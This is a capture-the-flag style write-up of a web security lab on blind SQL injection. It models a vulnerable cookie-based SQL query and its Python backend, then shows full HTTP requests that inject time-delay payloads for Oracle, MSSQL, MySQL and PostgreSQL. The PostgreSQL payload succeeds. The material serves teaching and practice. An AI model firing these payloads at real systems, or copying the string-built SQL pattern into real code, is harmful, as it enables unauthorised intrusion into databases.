# Lab 11: Blind SQL injection with time delays

## Description

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to cause a 10 second delay.

---

## Solution

The objective of this lab is to exploit the SQL-injectable tracking cookie to cause a 10 second delay in the application's response. The application provides no real feedback based on the outcome of the SQL query, but since it executes the SQL query synchronously before returning the HTTP response, we can ask it questions and leverage time delays to interpret its answers.

### Modeling the injectable SQL query and backend code

We first identify the vulnerable tracking cookie as `TrackingId`. Since the application provides no real feedback based on the outcome of the SQL query's execution, there's no real way to validate whether the cookie is truly vulnerable except for guessing the structure of the SQL query and attempting to inject a time delay.

We'll start with the former. The structure of the SQL query probably looks like:

```sql
SELECT TrackingId FROM TrackingIds WHERE TrackingId = '$TRACKING_ID'
```

Based on the behavior of the application, the backend server code probably looks like:

```python
tracking_id = request.cookies['TrackingId']
sql_query = f"SELECT TrackingId FROM TrackingIds WHERE TrackingId = '{tracking_id}'"
try:
	rows = db.execute(sql_query)  # SQL query is executed synchronously
except SQLError:
	pass  # SQL error is caught and ignored
if len(rows) > 0:
	do_some_asynchronous_tracking(rows[0].TrackingId)
render("Page")  # Page renders regardless of outcome of SQL query
```

Now we want to inject a time delay into the query to validate the presence of the SQL injection vulnerability. Time delay syntax varies between database types and due to the lack of feedback, we don't yet have any way to know what type of database the web application is using. Thus, we will test several different time delay commands before we can get one to work.

### Testing time-delay injections

#### Oracle

```http
GET /filter?category=Pets HTTP/1.1
Host: ac691ff21eae8a9e80de12c300110035.web-security-academy.net
Cookie: TrackingId=N9X8wuzMzU3BAatC'%3b dbms_pipe.receive_message(('a'),10)--; session=5GVykxWArwCZo4npgwkH1JAkXILpqycn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

No delay.

#### Microsoft SQL

```http
GET /filter?category=Pets HTTP/1.1
Host: ac691ff21eae8a9e80de12c300110035.web-security-academy.net
Cookie: TrackingId=N9X8wuzMzU3BAatC'%3b WAITFOR DELAY '0:0:10'--; session=5GVykxWArwCZo4npgwkH1JAkXILpqycn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

No delay.

#### MySQL

```http
GET /filter?category=Pets HTTP/1.1
Host: ac691ff21eae8a9e80de12c300110035.web-security-academy.net
Cookie: TrackingId=N9X8wuzMzU3BAatC'%3b SELECT sleep(10)#; session=5GVykxWArwCZo4npgwkH1JAkXILpqycn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

No delay.

#### PostgreSQL

```http
GET /filter?category=Pets HTTP/1.1
Host: ac691ff21eae8a9e80de12c300110035.web-security-academy.net
Cookie: TrackingId=N9X8wuzMzU3BAatC'%3b SELECT pg_sleep(10)--; session=5GVykxWArwCZo4npgwkH1JAkXILpqycn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Success! Consistent 10-second delay.